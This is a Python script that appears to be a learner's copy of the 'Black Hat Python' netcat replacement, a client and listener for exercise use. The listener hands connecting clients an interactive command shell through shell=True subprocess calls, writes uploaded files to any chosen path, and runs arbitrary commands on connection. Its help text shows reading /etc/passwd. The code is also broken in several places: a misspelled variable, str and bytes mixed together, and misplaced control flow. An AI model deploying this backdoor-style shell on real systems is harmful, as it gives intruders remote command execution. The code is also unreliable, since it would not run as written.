import sys
import socket
import getopt
import threading
import subprocess

#global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

#The help screen similar to Linux print out 
def help():
	print("Black Hat Python Netcat Replacement\n")
	print("Usage: netcat.py -t target -p port")
	print("-l --listen\t\t- listen on [host]:[port] for\n\t\t\t incoming connections")
	print("-e --execute=file_to_run - execute the given file upon\n\t\t\t receiving a connection")
	print("-c --command\t\t- initialize a command shell")
	print("-u --upload=destination  - upon receiving connection upload a\n\t\t\t file and write to [destination]")
	print("\n")
	print("Examples: ")
	print("netcat.py -t 192.168.0.1 -p 5555 -l -c")
	print("netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
	print("netcat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
	print("echo 'ABCDEFGHI' | ./netcat.py -t 192.168.11.12 -p 135")
	sys.exit(0)
	
def client_sender(buffer):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	try:
		#connect to target
		print("1")
		print(buffer)
		client.connect((target,port))
		print("2")
		if len(buffer):
			print("2")
			client.send(buffer)
			
		while True:
			#wait for return data
			recv_len = 1
			response = ""
			print("3")
			while rev_len:
				data = client.recv(4096)
				recv_len = len(data)
				response += data
				print("4")
				if recv_len < 4096:
					break
			print(response)
			#wait for more input
			buffer = input().encode()
			buffer += "\n"
			#send it
			client.send(buffer)
			
	except:
		print("[*] Exception!, Exiting")
		#close connection
		client.close()
		
def server_loop():
	global target

	#if no target, listen on all interfaces
	if not len(target):
		target = "0.0.0.0"
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target, port))
	server.listen(5)
	
	while True:
		client_socket, addr = server.accept()
		print("New connection made!!")
		#make thread to handle new client
		client_thread = threading.Thread(target=client_handler, args=(client_socket,))
		client_thread.start()
		
def run_command(command):
	#trim
	command = command.rstrip()
	#run and get output
	try:
		output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
	except:
		output = "Failed to execute command.\r\n"
	#send back output
	return output
			
def client_handler(client_socket):
	global upload
	global execute
	global command
	
	#check for upload
	if len(upload_destination):
		#read in all of the bytes and write to destination
		file_buffer = ""
		#read until EOF
		while True:
			data = client_socket.recv(1024)
			if not data:
				break
			else:
				file_buffer += data
				
		#take the bytes and attempt to print
		try:
			file_descriptor = open(upload_destination, "wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()
			
			#Success message
			
			client_socket.send("Successfully saved file to %s\r\n" %upload_destination)
		
		except:
			client_socket.send("Failed to save file to %s\r\n" %upload_destination)
		
		#check for command execution
		if len(execute):
			#run command
			output = run_command(execute)
			
			client_socket.send(output)
			
		#enter another loop if a shell was requested
		if command:
			while True:
				#display prompt
				client_socket.send("netcat:$ ")
				#wait until we get a \n <ENTER>
				cmd_buffer = ""
				while "\n" not in cmd_buffer:
					cmd_buffer += client_socket.recv(1024)	
				#send back output
				response = run_command(cmd_buffer)
				#send response
				client_socket.send(response)
				
					
	
def main():
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target
	
	if not len(sys.argv[1:]):
		help()
	
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
		["help","listen","execute","target","port","command","upload"])
	except getopt.GetoptError as err:
		print(str(err))
		help()
	
	for o,a in opts:
		if o in ("-h", "--help"):
			help()
		elif o in ("-l", "--listen"):
			listen = True
		elif o in ("-e", "--execute"):
			execute = a
		elif o in ("-c", "--commandshell", "--command"):
			command = True
		elif o in ("-u", "--upload"):
			upload_destination = a
		elif o in ("-t", "--target"):
			target = a
		elif o in ("-p", "--port"):
			port = int(a)
		else:
			assert(False, "Unhandled Option")
			
		#Interfacing with stdin?
		if not listen and len(target) and port > 0:
			'''read in buffer from cmd line,
			this will block, so CTRL-D if not sending input
			to stdin'''
			'''The book uses the line below, but for some reason it is not
			working while im debugging
			buffer = sys.stdin.read()'''
			buffer = input().encode()
			#send data
			client_sender(buffer)
		''' listen and potentially upload things, execute commands, and drop
		a shell back depending on arguments'''
		if listen:
			server_loop()
			
main()